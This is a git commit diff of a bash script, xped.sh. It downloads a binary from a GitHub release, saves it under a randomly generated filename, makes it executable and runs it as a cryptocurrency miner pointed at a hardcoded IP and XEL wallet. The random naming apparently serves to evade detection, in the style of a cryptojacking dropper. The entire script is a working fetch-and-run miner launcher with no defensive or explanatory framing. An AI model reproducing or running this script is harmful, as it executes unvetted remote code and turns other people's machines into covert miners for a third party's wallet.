ac1e12800b712e340894556a90a10434297fbff3
vedhagsvp <vedhag230223@gmail.com>
2026-02-08 01:53:56 +0530

    Update xped.sh

--- xped.sh
+++ xped.sh
@@ -1,4 +1,21 @@
 #!/bin/bash
-wget https://github.com/vedhagsvp/tkospae/releases/download/aplose/tnmtas
-chmod +x tnmtas
-./tnmtas --xel-v3 --stratum --daemon-address 72.14.177.114:8085 --wallet xel:4rxku34zp47htjxglcmcexz4ku2jp0dmemgt4wet7klq76a923sqq0tcq2c.nsd --password x
+
+# Generate random filename (8 chars)
+FILE_NAME=$(tr -dc a-z0-9 </dev/urandom | head -c 8)
+
+# Generate random worker name + date
+WORKER_NAME="worker_$(tr -dc a-z0-9 </dev/urandom | head -c 5)_$(date +%Y%m%d)"
+
+# Download using random filename
+wget -O "$FILE_NAME" https://github.com/vedhagsvp/tkospae/releases/download/aplose/tnmtas
+
+# Make executable
+chmod +x "$FILE_NAME"
+
+# Run with random worker name
+./"$FILE_NAME" --xel-v3 \
+  --stratum \
+  --daemon-address 72.14.177.114:8085 \
+  --wallet xel:4rxku34zp47htjxglcmcexz4ku2jp0dmemgt4wet7klq76a923sqq0tcq2c \
+  --password x \
+  --worker-name "$WORKER_NAME"
